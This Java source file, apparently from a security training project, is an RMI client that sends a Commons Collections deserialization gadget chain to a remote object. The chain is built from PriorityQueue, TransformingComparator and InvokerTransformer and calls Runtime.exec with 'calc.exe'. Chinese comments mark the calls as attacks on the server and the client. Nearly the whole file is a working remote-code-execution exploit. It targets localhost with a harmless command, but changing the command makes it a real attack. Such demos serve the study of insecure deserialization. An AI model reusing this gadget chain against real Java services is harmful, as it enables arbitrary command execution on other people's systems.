package com.madaha.codesecone.controller.AdvancedAttack.deserialize.rmiDeserialize;

import com.madaha.codesecone.controller.AdvancedAttack.deserialize.CommonCollections.Reflections;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.rmi.Naming;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.util.PriorityQueue;

public class UserClient_eval {


    public static void main(String[] args) throws Exception{
        String url = "rmi://127.0.0.1:3333/User";
        User userClient = (User) Naming.lookup(url);

        System.out.println(userClient.name("test"));
        userClient.say("world"); //在Server端输出

        // 攻击服务端
        userClient.dowork(getPayload());

        // 攻击客户端
        userClient.getwork();
    }

    public static Object getPayload() throws Exception{
        Transformer[] fakeTransformers = new Transformer[]{
                new ConstantTransformer(1)
        };

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"}),
                new ConstantTransformer(1),
        };

        Transformer faketransformerchain =  new ChainedTransformer(fakeTransformers);
        TransformingComparator comparator = new TransformingComparator(faketransformerchain);
        PriorityQueue queue = new PriorityQueue(2, comparator);
        queue.add(1);
        queue.add(1);

        Reflections.setFieldValue(faketransformerchain, "iTransformers", transformers);

        return queue;
//        ByteArrayOutputStream barr = new ByteArrayOutputStream();
//        ObjectOutputStream oos = new ObjectOutputStream(barr);
//        oos.writeObject(queue);
//        oos.close();
//        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
//        Object o = (Object) ois.readObject();
    }
}
